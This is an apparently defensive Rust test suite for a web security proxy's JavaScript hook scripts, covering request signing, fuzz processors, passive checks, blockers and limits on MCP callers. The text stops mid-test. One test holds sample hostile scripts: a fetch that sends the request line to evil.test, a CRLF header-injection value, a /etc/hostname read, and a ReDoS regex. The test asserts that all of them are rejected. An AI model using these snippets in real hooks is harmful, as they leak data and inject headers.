//! Hook scripts end to end: a rule whose replacement a script makes, a fuzz payload processor,
//! and a passive check; what a failing script leaves alone and says; and what a caller through
//! MCP may not do with any of them.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

const MCP: &str = "BRAINPROXY_MCP_CALL";
const CLIENT: &str = "BRAINPROXY_CLIENT";

struct Env {
    project: PathBuf,
    home: PathBuf,
    dir: PathBuf,
}

impl Env {
    fn new(name: &str) -> Self {
        let dir = std::env::temp_dir().join(format!("bp-scripts-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let env = Env { project: dir.join("p.bpdb"), home: dir.join("home"), dir: dir.clone() };
        env.ok(&["engagement", "start", "--target", "127.0.0.1", "--target", "localhost"]);
        env
    }

    /// Runs the CLI with these provenance variables (the test's own are removed) and stdin.
    fn run_as(&self, vars: &[(&str, &str)], args: &[&str], stdin: Option<&[u8]>) -> (i32, Value) {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_brainproxy"));
        cmd.env_remove(MCP).env_remove(CLIENT).envs(vars.iter().copied());
        cmd.args(["--format", "json", "--project"]).arg(&self.project).arg("--home").arg(&self.home).args(args);
        cmd.stdin(if stdin.is_some() { Stdio::piped() } else { Stdio::null() }).stdout(Stdio::piped());
        let mut child = cmd.spawn().unwrap();
        if let Some(input) = stdin {
            child.stdin.take().unwrap().write_all(input).unwrap();
        }
        let out = child.wait_with_output().unwrap();
        let v = serde_json::from_slice(&out.stdout).unwrap_or(Value::Null);
        (out.status.code().unwrap(), v)
    }

    fn run(&self, args: &[&str]) -> (i32, Value) {
        self.run_as(&[], args, None)
    }

    fn ok(&self, args: &[&str]) -> Value {
        let (code, v) = self.run(args);
        assert_eq!(code, 0, "{args:?} -> {v}");
        v["data"].clone()
    }

    fn ok_stdin(&self, args: &[&str], stdin: &[u8]) -> Value {
        let (code, v) = self.run_as(&[], args, Some(stdin));
        assert_eq!(code, 0, "{args:?} -> {v}");
        v["data"].clone()
    }

    /// The error message of a command that must fail.
    fn refused(&self, vars: &[(&str, &str)], args: &[&str], stdin: Option<&[u8]>) -> String {
        let (code, v) = self.run_as(vars, args, stdin);
        assert_ne!(code, 0, "{args:?} -> {v}");
        v["error"]["message"].as_str().unwrap_or_default().to_string()
    }

    /// Writes a script beside the project and gives its path.
    fn script(&self, name: &str, text: &str) -> String {
        let file = self.dir.join(name);
        std::fs::write(&file, text).unwrap();
        file.display().to_string()
    }

    fn rows(&self, sql: &str) -> Vec<Value> {
        self.ok(&["query", sql])["rows"].as_array().unwrap().clone()
    }

    fn wait_rows(&self, sql: &str, n: i64) {
        let deadline = Instant::now() + Duration::from_secs(10);
        while self.rows(sql)[0][0].as_i64().unwrap() < n && Instant::now() < deadline {
            std::thread::sleep(Duration::from_millis(50));
        }
        assert_eq!(self.rows(sql)[0][0].as_i64().unwrap(), n, "{sql}");
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        let _ = self.run(&["proxy", "stop"]);
    }
}

/// Answers every request `403 Forbidden` with the request it got as the body.
fn serve() -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            std::thread::spawn(move || {
                let mut buf = vec![0u8; 16384];
                let mut len = 0;
                while !buf[..len].windows(4).any(|w| w == b"\r\n\r\n") {
                    match s.read(&mut buf[len..]) {
                        Ok(0) | Err(_) => return,
                        Ok(n) => len += n,
                    }
                }
                let head = format!(
                    "HTTP/1.1 403 Forbidden\r\nContent-Type: text/plain\r\nX-Frame-Options: DENY\r\n\
                     Content-Length: {len}\r\nConnection: close\r\n\r\n"
                );
                let _ = s.write_all(head.as_bytes());
                let _ = s.write_all(&buf[..len]);
            });
        }
    });
    port
}

/// A request through the proxy at `listen`; returns the whole response.
fn through(listen: &str, port: u16, target: &str, headers: &str) -> String {
    let mut s = TcpStream::connect(listen).unwrap();
    write!(
        s,
        "GET http://127.0.0.1:{port}{target} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n{headers}Connection: close\r\n\r\n"
    )
    .unwrap();
    let mut resp = Vec::new();
    s.read_to_end(&mut resp).unwrap();
    String::from_utf8_lossy(&resp).into_owned()
}

fn wait_for_settings() {
    // The proxy reloads settings every 300 ms.
    std::thread::sleep(Duration::from_millis(700));
}

fn ids(v: &Value) -> Vec<u64> {
    v.as_array().into_iter().flatten().filter_map(Value::as_u64).collect()
}

const SIGN: &str = "function replace(match, ctx) {
    const r = ctx.request;
    return CryptoJS.HmacSHA256(r.method + ' ' + r.path + '?' + (r.query || '') + ' ' + r.body, 'k3y').toString();
}";

/// What `SIGN` makes of a request.
fn signature(method: &str, path: &str, query: &str, body: &str) -> String {
    use brainproxy_core::sign::{hmac_digest, HmacAlg};
    let mac = hmac_digest(HmacAlg::Sha256, b"k3y", format!("{method} {path}?{query} {body}").as_bytes());
    mac.iter().map(|b| format!("{b:02x}")).collect()
}

#[test]
fn a_script_rule_signs_what_the_proxy_send_and_the_fuzzer_send() {
    let port = serve();
    let env = Env::new("sign");
    let script = env.script("sign.js", SIGN);
    let listed = env.ok(&[
        "rules",
        "add",
        "--location",
        "request-header",
        "--name",
        "X-Sig",
        "--script",
        &script,
        "--applies-to",
        "proxy,send,fuzz",
    ]);
    let rule = &listed["rules"][0];
    assert_eq!((rule["replacer"].as_str(), rule["replace"].as_str()), (Some("script"), Some("")), "{listed}");
    assert_eq!(rule["script"]["file"], json!(std::fs::canonicalize(&script).unwrap()), "{listed}");
    assert_eq!(rule["script"]["sha256"].as_str().unwrap().len(), 64, "{listed}");

    // The proxy: the server sees the signature of the request it got.
    let listen = env.ok(&["proxy", "start", "--listen", "127.0.0.1:0"])["listen"].as_str().unwrap().to_string();
    wait_for_settings();
    let resp = through(&listen, port, "/api/me?a=1", "");
    assert!(resp.contains(&format!("X-Sig: {}", signature("GET", "/api/me", "a=1", ""))), "{resp}");
    env.wait_rows("SELECT count(*) FROM history WHERE source = 'proxy'", 1);
    let id = env.rows("SELECT id FROM history WHERE source = 'proxy'")[0][0].to_string();
    let shown = env.ok(&["history", "show", &id]);
    assert_eq!(shown["entry"]["edited_by"][0]["rule"], 1, "{shown}");
    assert!(!shown["original_request"]["content"].as_str().unwrap().contains("X-Sig"), "{shown}");
    env.ok(&["proxy", "stop"]);

    // send: the body is part of what is signed.
    let url = format!("http://127.0.0.1:{port}/item?id=7");
    let sent = env.ok(&["send", "--url", &url, "-X", "POST", "-d", "n=1"]);
    assert_eq!(ids(&sent["rules"]["request"]), [1], "{sent}");
    assert!(sent.get("rule_errors").is_none(), "{sent}");
    let body = sent["response"]["body"]["content"].as_str().unwrap();
    assert!(body.contains(&format!("X-Sig: {}", signature("POST", "/item", "id=7", "n=1"))), "{sent}");

    // The fuzzer: each request is signed with its payload in.
    let fuzz = format!("http://127.0.0.1:{port}/f?q=§a§");
    env.ok(&["fuzz", "run", "--url", &fuzz, "-p", "list:x,y"]);
    for q in ["x", "y"] {
        let rows = env.rows(&format!("SELECT req_headers FROM history WHERE source = 'fuzz' AND query = 'q={q}'"));
        let want = signature("GET", "/f", &format!("q={q}"), "");
        assert!(rows[0][0].as_str().unwrap().contains(&want), "{q}: {rows:?}");
    }
}

#[test]
fn a_failing_script_leaves_the_request_as_it_was_and_the_send_says_so() {
    let port = serve();
    let env = Env::new("fail");
    let url = format!("http://127.0.0.1:{port}/a");
    let add = |name: &str, text: &str| {
        let script = env.script(name, text);
        env.ok(&[
            "rules",
            "add",
            "--location",
            "request-header",
            "--name",
            "X-Made",
            "--script",
            &script,
            "--applies-to",
            "send",
        ]);
    };
    add("throws.js", "function replace(m, ctx) { throw new Error('no ' + ctx.request.path); }");
    add("number.js", "function replace() { return 42; }");
    add("breaks.js", "function replace() { return 'a\\r\\nHost: evil.test'; }");
    add("net.js", "function replace(m, ctx) { return fetch('http://evil.test/?' + ctx.request.line); }");
    add("files.js", "function replace() { return require('fs').readFileSync('/etc/hostname', 'utf8'); }");
    add("loops.js", "function replace() { /^(a+)+$/.test('a'.repeat(40) + 'b'); return 'x'; }");
    env.ok(&["rules", "add", "--location", "request-header", "--replace", "X-After: 1", "--applies-to", "send"]);

    let sent = env.ok(&["send", "--url", &url]);
    let body = sent["response"]["body"]["content"].as_str().unwrap();
    // No script's rule changed anything; the rule after them still did.
    assert!(!body.contains("X-Made") && !body.contains("evil.test") && body.contains("X-After: 1"), "{sent}");
    assert_eq!(ids(&sent["rules"]["request"]), [7], "{sent}");
    let errors: Vec<(u64, &str)> = sent["rule_errors"]
        .as_array()
        .unwrap()
        .iter()
        .map(|e| (e["id"].as_u64().unwrap(), e["error"].as_str().unwrap()))
        .collect();
    let why = [
        "Error: no /a",
        "it returned a number",
        "a line break or NUL",
        "fetch is not defined",
        "isn't available here",
        "time limit",
    ];
    assert_eq!(errors.len(), 6, "{sent}");
    for (i, (error, why)) in errors.iter().zip(why).enumerate() {
        assert!(error.0 == i as u64 + 1 && error.1.contains(why), "{error:?} / {why}");
    }
    // The row is of the request that went out: nothing of the failed rules is in it.
    let row = env.rows("SELECT req_headers FROM history ORDER BY id DESC LIMIT 1");
    assert!(!row[0][0].as_str().unwrap().contains("X-Made"), "{row:?}");
}

#[test]
fn rules_test_runs_a_script_and_a_changed_file_stops_its_rule() {
    let env = Env::new("test");
    let script = env.script("up.js", "function replace(m, ctx) { return m.groups[1].toUpperCase() + '@' + ctx.host; }");
    let request = b"GET /a?name=bob HTTP/1.1\r\nHost: h.test\r\n\r\n";
    // An unsaved rule from flags: nothing is stored.
    let args = [
        "rules",
        "test",
        "-",
        "--location",
        "query-param",
        "--name",
        "name",
        "--match",
        "^(\\w+)$",
        "--script",
        &script,
    ];
    let tried = env.ok_stdin(&args, request);
    assert!(tried["request"]["result"]["content"].as_str().unwrap().starts_with("GET /a?name=BOB@h.test "), "{tried}");
    assert_eq!(env.ok(&["rules", "list"])["rules"], json!([]));
    // --script and --replace are two ways to say the replacement.
    let (code, _) = env.run(&["rules", "add", "--location", "path", "--script", &script, "--replace", "/x"]);
    assert_ne!(code, 0);
    // A pin that isn't the file's, a file that doesn't parse, and one with no replace function.
    let no = |args: &[&str]| env.refused(&[], &[&["rules", "add", "--location", "path"][..], args].concat(), None);
    assert!(no(&["--script", &script, "--script-sha256", &"0".repeat(64)]).contains("not the one given"));
    let broken = env.script("broken.js", "function replace( {");
    assert!(no(&["--script", &broken]).contains("SyntaxError"));
    let other = env.script("other.js", "function process(p) { return p; }");
    assert!(no(&["--script", &other]).contains("it defines no replace function"));
    assert!(no(&["--script", "/nonexistent/x.js"]).contains("can't be read"));
    assert_eq!(env.ok(&["rules", "list"])["rules"], json!([]));

    // Saved, listed with its pin, and what `rules list` prints imports again.
    let listed = env.ok(&[
        "rules",
        "add",
        "--location",
        "query-param",
        "--name",
        "name",
        "--match",
        "^(\\w+)$",
        "--script",
        &script,
    ]);
    let sha256 = listed["rules"][0]["script"]["sha256"].as_str().unwrap().to_string();
    let imported = env.ok_stdin(&["rules", "import", "-"], listed.to_string().as_bytes());
    assert_eq!(imported["rules"][1]["script"], listed["rules"][0]["script"], "{imported}");
    assert_eq!(imported["rules"][1]["replacer"], "script");
    let tried = env.ok_stdin(&["rules", "test", "-", "--rule", "2"], request);
    assert_eq!(ids(&tried["request"]["rules"]), [2], "{tried}");

    // A failure is in the tester's result, not hidden in "unchanged".
    let throws = env.script("throws.js", "function replace() { throw new Error('boom'); }");
    let tried = env.ok_stdin(&["rules", "test", "-", "--location", "path", "--script", &throws], request);
    assert_eq!(tried["request"]["changed"], false, "{tried}");
    assert_eq!(tried["request"]["errors"], json!([{"id": 0, "error": "Error: boom"}]), "{tried}");

    // The file changes: the rule is listed as skipped and no longer applies, until it is added again.
    std::fs::write(&script, "function replace() { return 'changed'; }").unwrap();
    let listed = env.ok(&["rules", "list"]);
    let skipped = listed["skipped"].as_array().unwrap();
    assert_eq!(skipped.len(), 2, "{listed}");
    assert!(skipped[0]["reason"].as_str().unwrap().contains("changed since it was named"), "{listed}");
    let tried = env.ok_stdin(&["rules", "test", "-"], request);
    assert_eq!(
        (tried["request"]["changed"].as_bool(), tried["skipped"].as_array().map(Vec::len)),
        (Some(false), Some(2)),
        "{tried}"
    );
    assert!(env
        .refused(&[], &["rules", "test", "-", "--rule", "1"], Some(request))
        .contains("changed since it was named"));
    assert!(env.refused(&[], &["rules", "enable", "1"], None).contains("changed since it was named"));
    // An import can't bring a script in under a pin that isn't its file's.
    let stale = json!([{"location": "path", "pattern": "", "replacer": "script", "script": {"file": script, "sha256": sha256}}]);
    let e = env.refused(&[], &["rules", "import", "-"], Some(stale.to_string().as_bytes()));
    assert!(e.contains("rule 1 of the import") && e.contains("changed since it was named"), "{e}");
}

#[test]
fn a_script_processes_fuzz_payloads_and_a_failing_one_starts_no_run() {
    let port = serve();
    let env = Env::new("process");
    let url = format!("http://127.0.0.1:{port}/f?q=§a§&r=§b§");
    let script = env.script(
        "proc.js",
        "function process(payload, ctx) {
            if (payload === 'bad') throw new Error('no ' + payload);
            return ctx.set + '-' + payload + '-' + CryptoJS.MD5(payload).toString().slice(0, 4);
        }",
    );
    let chain = format!("2=upper,script:{script}");
    let run = env.ok(&[
        "fuzz",
        "run",
        "--url",
        &url,
        "--mode",
        "pitchfork",
        "-p",
        "list:a,b",
        "-p",
        "list:x,y",
        "--process",
        &chain,
    ]);
    assert_eq!((run["run"]["done"].as_i64(), run["run"]["errors"].as_i64()), (Some(2), Some(0)), "{run}");
    let mut queries: Vec<String> = env
        .rows("SELECT query FROM history WHERE source = 'fuzz' ORDER BY id")
        .iter()
        .map(|r| r[0].as_str().unwrap().to_string())
        .collect();
    // The run's requests go out side by side: their rows are in no set order.
    queries.sort();
    // Only set 2 went through the chain, after the step before the script.
    assert_eq!(queries, ["q=a&r=2-X-0212", "q=b&r=2-Y-57ce"]);
    // The run's record says which script processed it.
    let config = env.rows("SELECT config FROM fuzz_runs ORDER BY id DESC LIMIT 1")[0][0].as_str().unwrap().to_string();
    let config: Value = serde_json::from_str(&config).unwrap();
    assert_eq!(config["process_scripts"][0]["file"], json!(std::fs::canonicalize(&script).unwrap()), "{config}");
    assert_eq!(config["process_scripts"][0]["sha256"].as_str().unwrap().len(), 64);

    // A payload the script fails on: no run, no request.
    let before = env.rows("SELECT count(*) FROM history")[0][0].as_i64().unwrap();
    let runs = env.rows("SELECT count(*) FROM fuzz_runs")[0][0].as_i64().unwrap();
    let plain = format!("script:{script}");
    let e = env.refused(
        &[],
        &["fuzz", "run", "--url", &url, "--mode", "battering-ram", "-p", "list:ok,bad", "--process", &plain],
        None,
    );
    assert!(e.contains("payload 2 of set 1") && e.contains("no bad"), "{e}");
    let loops = env.script("loops.js", "function process(p) { /^(a+)+$/.test('a'.repeat(40) + 'b'); return p; }");
    let chain = format!("script:{loops}");
    let e = env.refused(
        &[],
        &["fuzz", "run", "--url", &url, "--mode", "battering-ram", "-p", "list:ok", "--process", &chain],
        None,
    );
    assert!(e.contains("time limit"), "{e}");
    let garbage = env.script("garbage.js", "function process(p) { return { payload: p }; }");
    let chain = format!("script:{garbage}");
    let e = env.refused(
        &[],
        &["fuzz", "run", "--url", &url, "--mode", "battering-ram", "-p", "list:ok", "--process", &chain],
        None,
    );
    assert!(e.contains("it returned an object"), "{e}");
    assert_eq!(env.rows("SELECT count(*) FROM history")[0][0].as_i64().unwrap(), before);
    assert_eq!(env.rows("SELECT count(*) FROM fuzz_runs")[0][0].as_i64().unwrap(), runs);
}

const CHECK: &str = "function check(x) {
    if (x.path === '/boom') throw new Error('boom');
    const frame = x.response.headers.find(([name]) => name.toLowerCase() === 'x-frame-options');
    if (x.status === 403 && frame) {
        return { name: 'Forbidden page says how it is framed', risk: 'low', param: frame[0], evidence: frame[1], id: 'framed' };
    }
}";

#[test]
fn a_script_check_finds_what_it_looks_for_in_recorded_exchanges() {
    let port = serve();
    let env = Env::new("check");
    let script = env.script("check.js", CHECK);
    let url = format!("http://127.0.0.1:{port}/a");
    env.ok(&["send", "--url", &url]);

    // Tried on a row first: nothing is saved.
    let tried = env.ok(&["scan", "script", "test", &script, "--history", "1"]);
    assert_eq!(tried["findings"][0]["alert_ref"], "script:test:framed", "{tried}");
    assert_eq!(
        (tried["findings"][0]["evidence"].as_str(), tried["errors"].as_array().map(Vec::len)),
        (Some("DENY"), Some(0))
    );
    let none = |source: &str| {
        env.rows(&format!("SELECT count(*) FROM findings WHERE alert_ref LIKE '{source}:%'"))[0][0].clone()
    };
    assert_eq!(none("script"), 0);

    let added = env.ok(&["scan", "script", "add", "framed", &script]);
    let listed = &added["scripts"][0];
    assert_eq!(
        (listed["id"].as_str(), listed["enabled"].as_bool(), listed["origin"].as_str()),
        (Some("script:framed"), Some(true), Some("cli")),
        "{added}"
    );
    assert!(env
        .refused(&[], &["scan", "script", "add", "bad name", &script], None)
        .contains("can't name a script check"));
    let wrong = env.script("wrong.js", "function replace(m) { return m.text; }");
    assert!(env
        .refused(&[], &["scan", "script", "add", "wrong", &wrong], None)
        .contains("it defines no check function"));
    let rules = env.ok(&["scan", "rules", "--filter", "script:framed"]);
    assert_eq!((rules["count"].as_i64(), rules["rules"][0]["script"].as_bool()), (Some(1), Some(true)), "{rules}");

    // Over the history there is, and over what is sent from now on.
    let stats = env.ok(&["scan", "passive", "--rescan"]);
    assert!(stats.get("script_errors").is_none(), "{stats}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/b")]);
    let found = env.rows(
        "SELECT source, alert_ref, name, risk, param, evidence, url FROM findings WHERE alert_ref LIKE 'script:%' ORDER BY id",
    );
    assert_eq!(found.len(), 2, "{found:?}");
    assert_eq!(
        found[0],
        json!([
            "passive",
            "script:framed:framed",
            "Forbidden page says how it is framed",
            "low",
            "X-Frame-Options",
            "DENY",
            url
        ])
    );
    // Wherever the finding is read, it says a user's script raised it.
    let id = env.rows("SELECT id FROM findings WHERE alert_ref LIKE 'script:%' ORDER BY id")[0][0].to_string();
    let shown = env.ok(&["findings", "show", &id]);
    assert!(shown.to_string().contains("Raised by the passive check script \\\"framed\\\""), "{shown}");

    // An exchange it fails on: the scan goes on, and says so.
    let sent = env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/boom")]);
    assert_eq!(sent["response"]["status"], 403, "{sent}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/c")]);
    assert_eq!(none("script"), 3);
    let stats = env.ok(&["scan", "passive", "--rescan"]);
    assert_eq!(stats["script_errors"][0]["script"], "framed", "{stats}");
    assert_eq!(
        (stats["script_errors"][0]["error"].as_str(), stats["script_errors"][0]["count"].as_i64()),
        (Some("Error: boom"), Some(1))
    );
    assert_eq!((stats["removed"].as_i64(), none("script")), (Some(0), json!(3)), "{stats}");

    // Switched off and on like any passive check.
    env.ok(&["scan", "disable", "script:framed"]);
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/d")]);
    assert_eq!(none("script"), 3);
    assert_eq!(env.ok(&["scan", "script", "list"])["scripts"][0]["enabled"], false);
    env.ok(&["scan", "enable", "script:framed"]);

    // The file changes: the check stops, says why, and adding it again under its name re-pins it.
    std::fs::write(&script, CHECK.replace("'low'", "'medium'")).unwrap();
    let listed = env.ok(&["scan", "script", "list"]);
    assert!(listed["scripts"][0]["problem"].as_str().unwrap().contains("changed since it was named"), "{listed}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/e")]);
    assert_eq!(none("script"), 3);
    let again = env.ok(&["scan", "script", "add", "framed", &script]);
    assert!(again["scripts"].as_array().unwrap().len() == 1 && again["scripts"][0].get("problem").is_none(), "{again}");
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/f")]);
    assert_eq!(none("script"), 4);

    assert_eq!(env.ok(&["scan", "script", "remove", "framed"])["scripts"], json!([]));
    assert!(env.refused(&[], &["scan", "script", "remove", "framed"], None).contains("script check framed"));
    env.ok(&["send", "--url", &format!("http://127.0.0.1:{port}/g")]);
    assert_eq!(none("script"), 4, "its findings stay, and it finds no more");
}

#[test]
fn a_caller_through_mcp_runs_no_script_of_its_own() {
    let port = serve();
    let env = Env::new("mcp");
    let agent = [(MCP, "1")];
    let script = env.script("sign.js", SIGN);
    let check = env.script("check.js", CHECK);
    let process = env.script("proc.js", "function process(p) { return p + '!'; }");
    let url = format!("http://127.0.0.1:{port}/a?q=§1§");
    let request = b"GET /a HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n";
    let why = "runs code from a file, so it isn't offered through MCP";

    let refused = |args: &[&str], stdin: Option<&[u8]>| {
        let e = env.refused(&agent, args, stdin);
        assert!(e.contains(why), "{args:?}: {e}");
    };
    refused(&["rules", "add", "--location", "request-header", "--name", "X-Sig", "--script", &script], None);
    refused(&["rules", "test", "-", "--location", "path", "--script", &script], Some(request));
    refused(&["fuzz", "run", "--url", &url, "-p", "list:a", "--process", &format!("upper,script:{process}")], None);
    refused(&["scan", "script", "add", "framed", &check], None);
    refused(&["scan", "script", "test", &check, "--history", "1"], None);
    // Not even a file that isn't there is looked at.
    refused(&["fuzz", "run", "--url", &url, "-p", "list:a", "--process", "script:/nonexistent.js"], None);
    refused(&["rules", "add", "--location", "path", "--script", "/nonexistent.js"], None);
    assert_eq!(env.rows("SELECT count(*) FROM history")[0][0], 0);

    // A person's script rule, added disabled: an agent can't import one, nor turn this one on.
    env.ok(&[
        "rules",
        "add",
        "--location",
        "request-header",
        "--name",
        "X-Sig",
        "--script",
        &script,
        "--applies-to",
        "send",
        "--disabled",
    ]);
    let listed = env.ok(&["rules", "list"]);
    refused(&["rules", "import", "-"], Some(listed.to_string().as_bytes()));
    refused(&["rules", "enable", "1"], None);
    // Nor have its script run by trying the rule: the tester tries a picked rule enabled or not.
    refused(&["rules", "test", "-", "--rule", "1"], Some(request));
    assert_eq!(env.ok(&["rules", "list"])["rules"].as_array().unwrap().len(), 1);
    // Nor a person's script check that was switched off.
    env.ok(&["scan", "script", "add", "framed", &check]);
    env.ok(&["scan", "disable", "script:framed"]);
    refused(&["scan", "enable", "script:framed"], None);

    // What a person set applies to an agent's requests, as a signer's script does; and an agent
    // may try a saved rule, switch a script off and read what there is.
    env.ok(&["rules", "enable", "1"]);
    env.ok(&["scan", "enable", "script:framed"]);
    let (code, sent) = env.run_as(&agent, &["send", "--url", &format!("http://127.0.0.1:{port}/a")], None);
    assert_eq!(code, 0, "{sent}");
    let body = sent["data"]["response"]["body"]["content"].as_str().unwrap();
    assert!(body.contains(&format!("X-Sig: {}", signature("GET", "/a", "", ""))), "{sent}");
    assert_eq!(env.rows("SELECT count(*) FROM findings WHERE alert_ref = 'script:framed:framed'")[0][0], 1);
    let (code, tried) = env.run_as(&agent, &["rules", "test", "-", "--rule", "1"], Some(request));
    assert_eq!((code, ids(&tried["data"]["request"]["rules"])), (0, vec![1]), "{tried}");
    for args in [
        &["rules", "list"][..],
        &["scan", "script", "list"],
        &["scan", "disable", "script:framed"],
        &["rules", "disable", "1"],
    ] {
        let (code, out) = env.run_as(&agent, args, None);
        assert_eq!(code, 0, "{args:?}: {out}");
    }
}

#[test]
fn what_a_proxied_rules_script_failed_on_is_listed_with_the_rules() {
    let port = serve();
    let env = Env::new("noted");
    let throws = env.script(
        "throws.js",
        "function replace(m, ctx) { if (ctx.request.path === '/bad') throw new Error('no /bad'); return 'ok'; }",
    );
    env.ok(&["rules", "add", "--location", "request-header", "--name", "X-Made", "--script", &throws]);
    let listen = env.ok(&["proxy", "start", "--listen", "127.0.0.1:0"])["listen"].as_str().unwrap().to_string();
    wait_for_settings();
    assert!(through(&listen, port, "/fine", "").contains("X-Made: ok"));
    assert_eq!(env.ok(&["rules", "list"])["failures"], json!([]));
    // The request goes on as the client sent it, and the rule's row says its script failed.
    let resp = through(&listen, port, "/bad", "");
    assert!(resp.starts_with("HTTP/1.1 403") && !resp.contains("X-Made"), "{resp}");
    let deadline = Instant::now() + Duration::from_secs(10);
    let mut failures = json!([]);
    while failures == json!([]) && Instant::now() < deadline {
        std::thread::sleep(Duration::from_millis(50));
        failures = env.ok(&["rules", "list"])["failures"].clone();
    }
    assert_eq!(
        (failures[0]["id"].as_u64(), failures[0]["error"].as_str(), failures[0]["engine"].as_str()),
        (Some(1), Some("Error: no /bad"), Some("proxy")),
        "{failures}"
    );
    assert!(failures[0]["time"].as_str().unwrap().ends_with('Z'), "{failures}");
    // It works again for other requests, and the note stays until the rule is switched off or on.
    assert!(through(&listen, port, "/fine", "").contains("X-Made: ok"));
    assert_eq!(env.ok(&["rules", "list"])["failures"].as_array().unwrap().len(), 1);
    assert_eq!(env.ok(&["rules", "disable", "1"])["failures"], json!([]));
    assert_eq!(env.ok(&["rules", "list"])["failures"], json!([]));
}

/// A target that must never be reached: it counts every connection it gets.
fn untouchable() -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let reached = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let count = reached.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            count.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            drop(stream);
        }
    });
    (port, reached)
}

/// Blocks or answers every request, by path: nothing is ever sent.
const STOPS: &str = "function request(req, ctx) {
    if (req.path.startsWith('/blocked')) return { block: 'not on ' + ctx.engine };
    return { response: { status: 200, headers: { 'Content-Type': 'text/html' },
        body: '<html><title>made up</title>' + ctx.engine + ' ' + req.method + ' ' + req.target + '</html>' } };
}";

#[test]
fn a_request_script_blocks_or_answers_in_every_engine_and_nothing_reaches_the_target() {
    let (port, reached) = untouchable();
    let env = Env::new("stops");
    let script = env.script("stops.js", STOPS);
    let listed =
        env.ok(&["rules", "add", "--location", "request", "--script", &script, "--applies-to", "proxy,send,fuzz,scan"]);
    let rule = &listed["rules"][0];
    assert_eq!((rule["location"].as_str(), rule["replacer"].as_str()), (Some("request"), Some("script")), "{listed}");
    // A response rule applies to an answer as to a server's response.
    env.ok(&[
        "rules",
        "add",
        "--location",
        "response-header",
        "--name",
        "X-Ruled",
        "--action",
        "add",
        "--replace",
        "yes",
        "--applies-to",
        "proxy,send,scan",
    ]);
    let mark = "X-Brainproxy-Answer: rule 1; this response is the rule's script's, the target sent nothing";
    let untouched = |engine: &str| {
        assert_eq!(reached.load(std::sync::atomic::Ordering::SeqCst), 0, "{engine}: a connection reached the target");
    };

    // The proxy: an answer goes to the client as the script made it, marked; a block is an error.
    let listen = env.ok(&["proxy", "start", "--listen", "127.0.0.1:0"])["listen"].as_str().unwrap().to_string();
    wait_for_settings();
    let resp = through(&listen, port, "/answered?a=1", "");
    assert!(resp.starts_with("HTTP/1.1 200 OK\r\n") && resp.contains(mark) && resp.contains("X-Ruled: yes"), "{resp}");
    assert!(resp.contains("<title>made up</title>proxy GET ") && resp.ends_with("/answered?a=1</html>"), "{resp}");
    let resp = through(&listen, port, "/blocked", "");
    assert!(resp.starts_with("HTTP/1.1 403 Forbidden\r\n") && resp.contains("X-Brainproxy-Error: blocked"), "{resp}");
    assert!(resp.contains("blocked by the script of match-and-replace rule 1: not on proxy"), "{resp}");
    env.wait_rows("SELECT count(*) FROM history WHERE source = 'proxy'", 2);
    env.ok(&["proxy", "stop"]);
    untouched("proxy");
    let rows = env.rows("SELECT path, status, error, edited_by FROM history WHERE source = 'proxy' ORDER BY id");
    assert_eq!((rows[0][0].as_str(), rows[0][1].as_u64(), &rows[0][2]), (Some("/answered"), Some(200), &Value::Null));
    assert_eq!(
        serde_json::from_str::<Value>(rows[0][3].as_str().unwrap()).unwrap(),
        json!([{"by": "cli", "rule": 1, "outcome": "answered"}])
    );
    assert_eq!((rows[1][0].as_str(), &rows[1][1]), (Some("/blocked"), &Value::Null));
    assert!(rows[1][2].as_str().unwrap().contains("not on proxy"), "{rows:?}");
    assert_eq!(serde_json::from_str::<Value>(rows[1][3].as_str().unwrap()).unwrap()[0]["outcome"], "blocked");

    // send: the answer is shown, saying whose it is; a block fails with its own exit code.
    let url = format!("http://127.0.0.1:{port}/answered/send");
    let sent = env.ok(&["send", "--url", &url, "-X", "POST", "-d", "x=1"]);
    assert_eq!(sent["answered_by"]["rule"], 1, "{sent}");
    assert_eq!(ids(&sent["rules"]["response"]), [2], "{sent}");
    assert!(sent["response"]["body"]["content"].as_str().unwrap().contains("send POST /answered/send"), "{sent}");
    let (code, v) = env.run(&["send", "--url", &format!("http://127.0.0.1:{port}/blocked/send")]);
    assert_eq!((code, v["error"]["kind"].as_str()), (7, Some("blocked")), "{v}");
    assert!(v["error"]["message"].as_str().unwrap().contains("not on send"), "{v}");
    // A race isn't sent at all, and leaves no rows.
    let before = env.rows("SELECT count(*) FROM history")[0][0].clone();
    let (code, v) = env.run(&["send", "--url", &url, "--race", "2"]);
    assert_eq!((code, v["error"]["kind"].as_str()), (7, Some("blocked")), "{v}");
    assert_eq!(env.rows("SELECT count(*) FROM history")[0][0], before);
    untouched("send");
    let rows = env.rows("SELECT path, status, edited_by FROM history WHERE source = 'send' ORDER BY id");
    assert_eq!(rows.len(), 2, "{rows:?}");
    assert!(rows[0][2].as_str().unwrap().contains("answered") && rows[1][2].as_str().unwrap().contains("blocked"));

    // The fuzzer, whatever it keeps: each answer has its marked row, each block its error.
    for store in ["all", "none"] {
        let fuzz = format!("http://127.0.0.1:{port}/§p§/{store}");
        env.ok(&["fuzz", "run", "--url", &fuzz, "-p", "list:answered,blocked", "--store", store]);
